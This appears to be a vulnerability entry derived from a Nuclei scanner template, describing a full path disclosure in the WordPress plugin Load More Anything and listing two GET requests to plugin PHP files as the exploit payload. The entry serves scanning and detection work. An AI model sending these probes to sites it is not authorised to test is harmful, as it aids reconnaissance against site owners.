# Vulnerability: WordPress Load More Anything - Full Path Disclosure
**Classification:** WP
**Source:** Nuclei Template (`wp-ajax-load-more-anything-fpd.yaml`)

## Description
WordPress Plugin Load More Anything files are publicly accessible without ABSPATH protection, exposing sensitive server path information through PHP error messages when accessed directly.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/ajax-load-more-anything/admin/Menu.php
GET {{BaseURL}}/wp-content/plugins/ajax-load-more-anything/inc/ald-functions.php
```

